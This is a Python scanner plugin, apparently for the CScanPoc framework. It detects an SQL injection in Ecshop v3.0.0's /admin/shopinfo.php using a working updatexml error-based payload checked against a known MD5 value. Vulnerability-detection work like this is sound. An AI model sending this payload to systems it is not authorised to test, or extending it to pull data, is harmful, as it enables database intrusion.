# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0025'  # 平台漏洞编号，留空
    name = 'Ecshop  /admin/shopinfo.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-12-07'  # 漏洞公布时间
    desc = '''
        文件/admin/shopinfo.php中107-109行：
        没有对传入对id进行处理，直接带入了sql语句导致了注入的发生。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4182/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = 'v3.0.0 RELEASE 20160518'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a143a86e-98aa-404d-959a-12374f677961'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/admin/shopinfo.php?act=edit&id=1 and updatexml(1,concat(0x7e,(md5(c))),0)"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
